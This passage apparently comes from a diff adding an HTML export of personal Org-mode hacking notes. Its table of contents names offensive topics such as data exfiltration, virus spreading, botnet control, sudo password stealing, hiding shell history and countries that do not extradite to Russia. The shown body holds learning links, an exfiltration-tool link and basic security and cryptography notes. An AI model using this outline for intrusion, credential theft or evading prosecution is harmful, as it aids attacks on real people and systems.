@@ -1,0 +1,4282 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2022-11-16 Wed 21:37 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>&lrm;</title>
+<meta name="generator" content="Org mode" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2019 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org57ff782">1. learning materials</a>
+<ul>
+<li><a href="#orgdbd36b4">1.1. youtube channels</a></li>
+</ul>
+</li>
+<li><a href="#org694720a">2. <span class="todo TODO">TODO</span> exfiltration</a></li>
+<li><a href="#orge1d4833">3. theory</a>
+<ul>
+<li><a href="#org9c3086c">3.1. Security Theory</a></li>
+<li><a href="#org3c72d2c">3.2. Computer access control</a></li>
+</ul>
+</li>
+<li><a href="#org5ab845a">4. criptography</a></li>
+<li><a href="#org3f21bc0">5. terms</a>
+<ul>
+<li><a href="#orgd547dc7">5.1. security terms</a></li>
+</ul>
+</li>
+<li><a href="#org2d018f8">6. law</a>
+<ul>
+<li><a href="#org03d5cf9">6.1. cyber attacker/attack attribution</a>
+<ul>
+<li><a href="#orgc64e2d0">6.1.1. techs</a></li>
+</ul>
+</li>
+<li><a href="#orgb685581">6.2. rus</a>
+<ul>
+<li><a href="#org01813ea">6.2.1. Неправомерный доступ к компьютерной информации ( ст. 272 УК)</a></li>
+<li><a href="#org2b34d90">6.2.2. Нарушение правил эксплуатации ЭВМ, системы ЭВМ или их сети (ст. 274 УК)</a></li>
+<li><a href="#org987e64e">6.2.3. Список стран, не выдающих преступников РФ</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#orgae7b2f9">7. Organizations https://owasp.org/</a></li>
+<li><a href="#org8e716b1">8. password</a>
+<ul>
+<li><a href="#org642c104">8.1. most common</a></li>
+<li><a href="#orga9d1ece">8.2. Default passwords wifi WPA2</a></li>
+<li><a href="#orgdf35c12">8.3. key sequence</a></li>
+<li><a href="#org2dcacba">8.4. dates</a></li>
+<li><a href="#orga8a9b28">8.5. patterns or modifiers</a></li>
+<li><a href="#org4588683">8.6. additional charactes</a></li>
+<li><a href="#org2d1398f">8.7. simple obfuscation or Replacement Password Pattern</a></li>
+<li><a href="#org1724d2c">8.8. words</a>
+<ul>
+<li><a href="#org89d81a7">8.8.1. rus:</a></li>
+<li><a href="#org5fc45e1">8.8.2. rus names</a></li>
+<li><a href="#org66d8bd5">8.8.3. universal:</a></li>
+<li><a href="#org7c3b37c">8.8.4. games:</a></li>
+<li><a href="#org4bec743">8.8.5. companies</a></li>
+<li><a href="#orgbc570a0">8.8.6. eng:</a></li>
+</ul>
+</li>
+<li><a href="#orgfd38235">8.9. stats</a></li>
+<li><a href="#org94b202b">8.10. generate wordlist</a>
+<ul>
+<li><a href="#org3c535d5">8.10.1. John the Ripper</a></li>
+<li><a href="#orgae4a1cd">8.10.2. app-crypt/johntheripper-jumbo</a></li>
+<li><a href="#org9390851">8.10.3. hashcat</a></li>
+<li><a href="#org1a64565">8.10.4. app-misc/crunch</a></li>
+</ul>
+</li>
+<li><a href="#org12b7512">8.11. my sequence</a></li>
+<li><a href="#org1e709d4">8.12. bash for passwords</a></li>
+<li><a href="#org0bc36eb">8.13. bash generate password</a></li>
+<li><a href="#orga5be5cb">8.14. my</a></li>
+<li><a href="#org2e15638">8.15. bases</a></li>
+<li><a href="#org99798c2">8.16. fast permutation</a></li>
+<li><a href="#org7caefc7">8.17. brutefoce in c</a></li>
+</ul>
+</li>
+<li><a href="#org24873f9">9. reverse engeering</a>
+<ul>
+<li><a href="#orgff96dc2">9.1. links</a></li>
+<li><a href="#orgd05e67c">9.2. objdump</a></li>
+<li><a href="#orgee67737">9.3. <span class="todo TODO">TODO</span> file</a></li>
+<li><a href="#org60d399b">9.4. Dynamic analysis</a>
+<ul>
+<li><a href="#org792287a">9.4.1. gdb</a></li>
+</ul>
+</li>
+<li><a href="#org68aa8ae">9.5. Assembler</a></li>
+<li><a href="#orge41945a">9.6. syntaxes</a></li>
+</ul>
+</li>
+<li><a href="#orgba9b689">10. attacks theory</a>
+<ul>
+<li><a href="#org55475d9">10.1. base attacks</a></li>
+<li><a href="#org25c168f">10.2. server-side attacks</a></li>
+<li><a href="#orgf316b2b">10.3. client-side attacks</a>
+<ul>
+<li><a href="#org8345d59">10.3.1. injection attack</a></li>
+</ul>
+</li>
+<li><a href="#orgf2e7818">10.4. OWASP top 10</a>
+<ul>
+<li><a href="#org28d628c">10.4.1. <span class="todo TODO">TODO</span> Broken Authentication and Session Management</a></li>
+<li><a href="#org845dd21">10.4.2. Sensitive Data Exposure</a></li>
+<li><a href="#orgf909dc8">10.4.3. XML External Entities (XXE).</a></li>
+<li><a href="#orgf5ec908">10.4.4. Broken Access Control.</a></li>
+<li><a href="#org53c57d5">10.4.5. Security Misconfiguration</a></li>
+<li><a href="#org18cb345">10.4.6. Insecure Deserialization</a></li>
+<li><a href="#org4321a91">10.4.7. Using Components with Known Vulnerabilities</a></li>
+<li><a href="#org3a49d90">10.4.8. Insufficient Logging &amp; Monitoring</a></li>
+</ul>
+</li>
+<li><a href="#org82f2f6c">10.5. links</a></li>
+</ul>
+</li>
+<li><a href="#orgc94306d">11. virus</a></li>
+<li><a href="#org8e56c79">12. virus spreading</a></li>
+<li><a href="#org200db34">13. NN code scaner</a></li>
+<li><a href="#org2c66691">14. penetration / infiltrate system</a>
+<ul>
+<li><a href="#org3c64227">14.1. penetration testing tool</a>
+<ul>
+<li><a href="#orgac55d30">14.1.1. Zed Attack Proxy (ZAP) OWASP project</a></li>
+<li><a href="#org374dc9a">14.1.2. links</a></li>
+</ul>
+</li>
+<li><a href="#org71369bf">14.2. linux .desktop file</a></li>
+<li><a href="#org3d7208c">14.3. webtesting suite</a></li>
+</ul>
+</li>
+<li><a href="#org65fe998">15. <span class="todo TODO">TODO</span> exfiltrate data</a></li>
+<li><a href="#org18fb1ff">16. Command and Control Center</a></li>
+<li><a href="#org41e581b">17. zombie control </a></li>
+<li><a href="#org5b98a31">18. <span class="todo TODO">TODO</span> </a></li>
+<li><a href="#orgb44af11">19. Linux investigate</a>
+<ul>
+<li><a href="#org894b34c">19.1. all</a></li>
+</ul>
+</li>
+<li><a href="#org0ea12c0">20. Linux hide</a>
+<ul>
+<li><a href="#org91c1ac4">20.1. bash history</a></li>
+</ul>
+</li>
+<li><a href="#org2a3ec0a">21. scanning network</a></li>
+<li><a href="#org83f6ede">22. Phishing</a></li>
+<li><a href="#orgde86af4">23. Exploit</a></li>
+<li><a href="#orgf5de474">24. nmap</a>
+<ul>
+<li><a href="#org581780f">24.1. theory</a>
+<ul>
+<li><a href="#org94bca08">24.1.1. ports</a></li>
+<li><a href="#org3136355">24.1.2. addressing</a></li>
+<li><a href="#org1299e14">24.1.3. port states</a></li>
+</ul>
+</li>
+<li><a href="#orgd247f05">24.2. default scan</a></li>
+<li><a href="#orgabf4c8c">24.3. SCAN TECHNIQUES</a></li>
+<li><a href="#org08e22af">24.4. nping  Network packet generation tool</a></li>
+<li><a href="#org1409ef6">24.5. <span class="todo TODO">TODO</span> ncat - reading, writing, redirecting, and encrypting data across a network</a></li>
+<li><a href="#orgafaf537">24.6. USECASES</a>
+<ul>
+<li><a href="#orgacc3d7a">24.6.1. system and version scan</a></li>
+<li><a href="#orgf548072">24.6.2. port scan:</a></li>
+<li><a href="#orgfad67ba">24.6.3. scan subnet</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#orga5672fb">25. wifi</a>
+<ul>
+<li><a href="#org8a5f084">25.1. net-wireless/kismet</a>
+<ul>
+<li><a href="#org4ee9a1e">25.1.1. links</a></li>
+</ul>
+</li>
+<li><a href="#orgd006c95">25.2. to watch communication</a></li>
+<li><a href="#org372a4c6">25.3. attacks</a>
+<ul>
+<li><a href="#orgadbcee7">25.3.1. attacks</a></li>
+<li><a href="#org8206555">25.3.2. KRACK (Key Reinstallation Attack)</a></li>
+<li><a href="#orgcb6869a">25.3.3. WPA2 brute force</a></li>
+<li><a href="#org9dfd73f">25.3.4. WPS online brute force</a></li>
+</ul>
+</li>
+<li><a href="#orgd584563">25.4. tcpdump</a></li>
+<li><a href="#org242227b">25.5. hashcat</a></li>
+<li><a href="#org117e2ee">25.6. hcxdumptool</a></li>
+<li><a href="#org25fbfc2">25.7. HashCat</a></li>
+<li><a href="#orgdddbb0f">25.8. john the reaper</a>
+<ul>
+<li><a href="#orgd65f157">25.8.1. rules</a></li>
+</ul>
+</li>
+<li><a href="#org40f72d2">25.9. <span class="todo TODO">TODO</span> JtR</a></li>
+<li><a href="#org9ebf5b2">25.10. https://beta.ivc.no/wiki/index.php/WPA_Attack</a></li>
+<li><a href="#org9d92ad6">25.11. https://kalitut.com/hacking-wifi-using-pmkid-and-aircrack-ng/</a></li>
+<li><a href="#org0065ad6">25.12. <span class="todo TODO">TODO</span> android https://github.com/VREMSoftwareDevelopment/WiFiAnalyzer</a></li>
+<li><a href="#org72bddde">25.13. my</a></li>
+</ul>
+</li>
+<li><a href="#orgcecebca">26. pixiewps - WPS offline brute force</a>
+<ul>
+<li><a href="#org3efc61c">26.1. reset router</a></li>
+<li><a href="#orgee9af42">26.2. links</a></li>
+<li><a href="#org24f1480">26.3. bully online WPS</a></li>
+</ul>
+</li>
+<li><a href="#orge92beaa">27. net-wireless/aircrack-ng</a>
+<ul>
+<li><a href="#org6c2cbb8">27.1. suite components</a></li>
+<li><a href="#org9949816">27.2. airbase</a>
+<ul>
+<li><a href="#orgf8a1552">27.2.1. features</a></li>
+</ul>
+</li>
+<li><a href="#org5680e03">27.3. airmon</a></li>
+<li><a href="#org5b54cc1">27.4. airodump</a>
+<ul>
+<li><a href="#org492fd18">27.4.1. default:</a></li>
+<li><a href="#orga7c059e">27.4.2. output</a></li>
+</ul>
+</li>
+<li><a href="#org16c63f6">27.5. aireplay-ng</a></li>
+<li><a href="#org39191be">27.6. airgraph-ng</a></li>
+<li><a href="#org721b5e5">27.7. links</a></li>
+</ul>
+</li>
+<li><a href="#orgdbc2b86">28. mdk5</a></li>
+<li><a href="#org514d1d9">29. wireshark</a>
+<ul>
+<li><a href="#orgfe1510b">29.1. filters wifi</a></li>
+<li><a href="#org89245d8">29.2. install</a></li>
+<li><a href="#org8099c41">29.3. tools</a></li>
+<li><a href="#orga1d3cd9">29.4. flags</a></li>
+<li><a href="#org2fcdabd">29.5. decrypt WPA2 frames</a></li>
+<li><a href="#orgcac7dd4">29.6. extract PMKID</a></li>
+</ul>
+</li>
+<li><a href="#org5a09666">30. python scapy - forge or decode packets</a></li>
+<li><a href="#org285d210">31. police ride</a>
+<ul>
+<li><a href="#org691dfdc">31.1. 1</a></li>
+<li><a href="#org83e5a06">31.2. 2</a></li>
+<li><a href="#org2b2da05">31.3. 3</a></li>
+</ul>
+</li>
+<li><a href="#org9d0c4eb">32. info gathering</a></li>
+<li><a href="#org45824a7">33. sudo linux password stealing</a></li>
+<li><a href="#org3ad0c09">34. distros</a>
+<ul>
+<li><a href="#org7bbe99c">34.1. kali</a></li>
+<li><a href="#org09b2b19">34.2. pentoo</a></li>
+<li><a href="#orgffa7fa1">34.3. Tails</a></li>
+</ul>
+</li>
+<li><a href="#org5479bce">35. virtualization</a></li>
+<li><a href="#orge7dc19f">36. culture</a>
+<ul>
+<li><a href="#org8cae4b9">36.1. classification of hackers</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+<p>
+-<b>- mode: Org; fill-column: 120; -</b>-
+</p>
+
+<p>
+TODO <a href="https://www.youtube.com/watch?v=RGilepZEApY&amp;list=PLfKe4duE4yJcv63tTh5q29Xc19fkG3GI7">https://www.youtube.com/watch?v=RGilepZEApY&amp;list=PLfKe4duE4yJcv63tTh5q29Xc19fkG3GI7</a>
+</p>
+
+<ul class="org-ul">
+<li>rus articles <a href="https://www.securitylab.ru/">https://www.securitylab.ru/</a></li>
+<li>web server vulnerables and penetration tester <a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a></li>
+<li><a href="https://github.com/ksanchezcld/Hacking_Cheat_Sheet">https://github.com/ksanchezcld/Hacking_Cheat_Sheet</a></li>
+<li><p>
+hacker <a href="https://github.com/axcheron">https://github.com/axcheron</a>
+</p>
+
+<p>
+20 Best WiFi Hacking Tools for PC (2022) - TechCult
+</p></li>
+</ul>
+<p>
+techcult.com/best-wifi-hacking-tools-for-pc/
+</p>
+
+<p>
+20 Best Wifi Hacking Tools for PC (2020) 1. Aircrack-ng 2. WireShark 3. Cain &amp;
+Abel 4. Nmap 5. Metasploit 6. Kismet 7. NetSparker 8. Airsnort 9. Ettercap 10. NetStumbler 11. Kiuwan 12. Nikto 13. Burp
+Suite 14. John the Ripper 15. Medusa 16. Angry IP Scanner 17. OpenVas 18. SQL Map 19. Intruder 20. Maltego 20
+Best Wifi Hacking Tools for PC (2020) 1.
+</p>
+
+
+<div id="outline-container-org57ff782" class="outline-2">
+<h2 id="org57ff782"><span class="section-number-2">1</span> learning materials</h2>
+<div class="outline-text-2" id="text-1">
+<ul class="org-ul">
+<li>arsenal <a href="https://w4rri0r.com/hacking-tools-windows-os-x-linux-android-solaris-unixware/vulnerability-assessment.html">https://w4rri0r.com/hacking-tools-windows-os-x-linux-android-solaris-unixware/vulnerability-assessment.html</a></li>
+</ul>
+<p>
+TODO <a href="https://www.tutorialspoint.com/wireless_security/">https://www.tutorialspoint.com/wireless_security/</a>
+</p>
+<ul class="org-ul">
+<li>lessons <a href="https://www.hacker101.com/">https://www.hacker101.com/</a></li>
+<li>training www.hackthebox.com</li>
+<li><a href="https://portswigger.net/web-security/learning-path">https://portswigger.net/web-security/learning-path</a></li>
+</ul>
+</div>
+<div id="outline-container-orgdbd36b4" class="outline-3">
+<h3 id="orgdbd36b4"><span class="section-number-3">1.1</span> youtube channels</h3>
+<div class="outline-text-3" id="text-1-1">
+<p>
+Null Byte :- heres <a href="https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g">https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g</a>
+SecurityFWD :- here <a href="https://www.youtube.com/c/SecurityFWD/videos">https://www.youtube.com/c/SecurityFWD/videos</a>
+LiveOverflow :- here <a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos</a>
+Seytonic :- here <a href="https://www.youtube.com/c/Seytonic/videos">https://www.youtube.com/c/Seytonic/videos</a>
+HackerSploit :- here <a href="https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q">https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q</a>
+Hak5 :- here <a href="https://www.youtube.com/channel/UC3s0BtrBJpwNDaflRSoiieQ">https://www.youtube.com/channel/UC3s0BtrBJpwNDaflRSoiieQ</a>
+Unkn0wnUser :- here <a href="https://www.youtube.com/c/Unkn0wnUser/videos">https://www.youtube.com/c/Unkn0wnUser/videos</a>
+PwnFunction :- here <a href="https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A">https://www.youtube.com/channel/UCW6MNdOsqv2E9AjQkv9we7A</a>
+Loi Liang Yang :- here <a href="https://www.youtube.com/channel/UC1szFCBUWXY3ESff8dJjjzw">https://www.youtube.com/channel/UC1szFCBUWXY3ESff8dJjjzw</a>
+OALabs :- here <a href="https://www.youtube.com/c/OALabs/videos">https://www.youtube.com/c/OALabs/videos</a>
+</p>
+</div>
+</div>
+</div>
+
+
+
+
+<div id="outline-container-org694720a" class="outline-2">
+<h2 id="org694720a"><span class="section-number-2">2</span> <span class="todo TODO">TODO</span> exfiltration</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Data exfiltration / data exportation / data extrusion / data theft
+</p>
+
+
+
+<p>
+<a href="https://xakep.ru/2022/09/22/infilltration-and-exfiltration/">https://xakep.ru/2022/09/22/infilltration-and-exfiltration/</a>
+как передать эти прог­раммы в ском­про­мети­рован­ную сеть <a href="https://github.com/s0i37/exfiltrate">https://github.com/s0i37/exfiltrate</a>
+</p>
+<ul class="org-ul">
+<li>пол­ном отсутс­твии тре­бова­ний к адми­нис­тра­тив­ным при­виле­гиям и при­цел на перено­симость — ведь на
+иссле­дуемом сер­вере ока­жет­ся либо Windows, либо Linux</li>
+</ul>
+</div>
+</div>
+
+
+<div id="outline-container-orge1d4833" class="outline-2">
+<h2 id="orge1d4833"><span class="section-number-2">3</span> theory</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+<a href="https://www.cybok.org/knowledgebase1_1/">https://www.cybok.org/knowledgebase1_1/</a>
+</p>
+
+<p>
+Human, Organisational &amp; Regulatory aspects
+</p>
+<ul class="org-ul">
+<li>TODO</li>
+</ul>
+</div>
+<div id="outline-container-org9c3086c" class="outline-3">
+<h3 id="org9c3086c"><span class="section-number-3">3.1</span> Security Theory</h3>
+<div class="outline-text-3" id="text-3-1">
+<p>
+Attacks &amp; Defences
+</p>
+<ul class="org-ul">
+<li>Malware &amp; Attack Technologies - exploits, ditributed malicious systems</li>
+<li>Adversarial Behaviours - malware supply chains, attack vectors, mokney transfers</li>
+<li>Security Operations &amp; Incident Management - securre systems, threat intelligence</li>
+<li>Forensics - collection analysis and reporting of digital evidence</li>
+</ul>
+
+
+<p>
+System security
+</p>
+<ul class="org-ul">
+<li>Operating Systems &amp; Virtualisation sec - sharing of resources, multiuser, database</li>
+<li>Cryptography - protocols that use them</li>
+<li>Formal Methods for Security -</li>
+<li>Hardware Security - Infrastructure security</li>
+<li>Network sec - Infrastructure security</li>
+<li>Authentication, Authorisation &amp; Accountability -</li>
+<li>Distributed Systems sec - secure consensus, time, event systems, peer-to-peer, cloud, multitenant data center</li>
+<li>Web &amp; Mobile sec - Software &amp; Plstform security</li>
+</ul>
+
+<p>
+Infrastructure security
+</p>
+<ul class="org-ul">
+<li>Applied Cryptography - application, issues around implementation,key management, use within protocols and systems</li>
+<li>Cyber Physical systems - internet of things &amp; industrial control systems, attacker models, large-scale infrastructures</li>
+<li>Physical Layer and Telecommunications sec - concertns ans limitations of the physical layer, radio frequency encoding, unintended radiation, interference</li>
+</ul>
+
+<p>
+Software &amp; Plstform security
+</p>
+<ul class="org-ul">
+<li>software sec - programming errors, sec bugs</li>
+<li>Secure software lifecycle -</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org3c72d2c" class="outline-3">
+<h3 id="org3c72d2c"><span class="section-number-3">3.2</span> Computer access control</h3>
+<div class="outline-text-3" id="text-3-2">
+<p>
+includes
+</p>
+<ul class="org-ul">
+<li>identification - prove person identity</li>
+<li>authorization -  approve request by access prolicy</li>
+<li>authentication - verifying that identity</li>
+<li>access approval - requests in session</li>
+<li>audit trail - audit log</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org5ab845a" class="outline-2">
+<h2 id="org5ab845a"><span class="section-number-2">4</span> criptography</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+One-time pad -  encryption technique that cannot be cracked
+</p>
+
+<p>
+Diffie–Hellman key exchange - one of the first public-key protocols
+</p>
+
+<p>
+Symmetric encryption - reverse substitution and transpositions transformations without knowing the key
+</p>
+
+<p>
+Asymmetric encryption - depend on mathematical problems that are thought to be difficult to solve
+</p>
+
+<p>
+<b>Semantic security</b> - ciphertext indistinguishability - hard to guess element of message space.  the adversary should
+learn no information from seeing a ciphertext
+</p>
+<ul class="org-ul">
+<li>semantically insecure algorithms: RSA</li>
+<li>random encryption padding schemes can increase Semantic security, ex  Optimal Asymmetric Encryption Padding (OAEP)</li>
+</ul>
+
+<p>
+attacks
+</p>
+<ul class="org-ul">
+<li>Known-plaintext attack (KPA) - attacker has access to both the plaintext (called a crib), and its encrypted version (ciphertext)</li>
+<li>Chosen-plaintext attack (CPA) - attacker can obtain the ciphertexts for arbitrary plaintexts</li>
+<li>Chosen-ciphertext attack (CCA) - with obtained decryptions of chosen ciphertexts.</li>
+<li>Adaptive chosen-ciphertext attack (CCA2) - attacker first sends a number of ciphertexts to be decrypted chosen
+adaptively, then uses the results to distinguish a target ciphertext without consulting the oracle on the challenge
+ciphertext - интерактивная форма атаки с выбранным зашифрованным текстом, в которой злоумышленник сначала отправляет
+несколько зашифрованных текстов для дешифрования, выбранных адаптивно, затем использует результаты для распознавания
+целевого зашифрованного текста, не консультируясь с oracle по зашифрованному тексту вызова</li>
+</ul>
+
+<p>
+<b>Oracle machine</b> - can be visualized as a Turing machine with a black box, called an oracle, which is able to solve
+certain problems in a single operation
+</p>
+
+<p>
